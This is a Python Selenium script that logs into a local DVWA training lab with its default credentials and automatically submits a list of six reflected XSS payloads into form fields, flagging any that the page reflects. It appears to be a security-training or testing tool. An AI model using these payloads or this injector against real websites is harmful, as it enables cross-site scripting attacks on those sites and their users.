from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import StaleElementReferenceException
import time

# XSS payloads to test
xss_payloads = [
    '<script>alert("XSS1")</script>',
    '"><script>alert("XSS2")</script>',
    "';alert(String.fromCharCode(88,83,83))//",
    "<img src=x onerror=alert('XSS3')>",
    "<svg onload=alert('XSS4')>",
    "<body onload=alert('XSS5')>"
]

# URLs
login_url = "http://localhost/DVWA/login.php"
xss_url = "http://localhost/DVWA/vulnerabilities/xss_r/"

# Login credentials
username = "admin"
password = "password"

# Function to test XSS payloads using Selenium
def test_xss_with_browser():
    # Set up Selenium WebDriver (ensure you have the right driver for your browser)
    driver = webdriver.Chrome()  # Use 'webdriver.Firefox()' for Firefox
    try:
        # Open the login page
        driver.get(login_url)
        print("Opened login page.")
        
        # Find the username, password fields and login button
        username_field = driver.find_element(By.NAME, "username")
        password_field = driver.find_element(By.NAME, "password")
        login_button = driver.find_element(By.NAME, "Login")
        
        # Enter credentials and login
        username_field.send_keys(username)
        password_field.send_keys(password)
        login_button.click()
        print("Logged in successfully.")
        
        # Navigate to the XSS vulnerability page
        driver.get(xss_url)
        print("Navigated to XSS vulnerability page.")
        
        # Find the form on the page
        forms = driver.find_elements(By.TAG_NAME, "form")
        if not forms:
            print("No forms found on the page. XSS testing aborted.")
            return
        
        print(f"Found {len(forms)} forms on the page. Testing for XSS vulnerabilities...\n")
        
        for form_index, form in enumerate(forms):
            for payload in xss_payloads:
                try:
                    # Re-locate the form to avoid stale element reference
                    forms = driver.find_elements(By.TAG_NAME, "form")
                    form = forms[form_index]

                    # Locate the text input fields in the form
                    inputs = form.find_elements(By.TAG_NAME, "input")
                    
                    # Enter the payload into the input fields
                    for input_field in inputs:
                        if input_field.get_attribute("type") == "text":
                            input_field.clear()
                            input_field.send_keys(payload)
                            print(f"Injected payload: {payload}")
                    
                    # Submit the form
                    form.submit()
                    time.sleep(2)  # Wait for the response to load
                    
                    # Check if the payload is reflected in the page source
                    if payload in driver.page_source:
                        print(f"Potential XSS vulnerability detected!\nPayload: {payload}")
                        break
                except StaleElementReferenceException:
                    print("Encountered StaleElementReferenceException. Re-locating elements...")
                    continue
        
        print("XSS testing completed.")
    finally:
        # Keep the browser open for debugging or close it after a delay
        time.sleep(10)  # Adjust as needed for debugging
        driver.quit()

# Main function
if __name__ == "__main__":
    test_xss_with_browser()
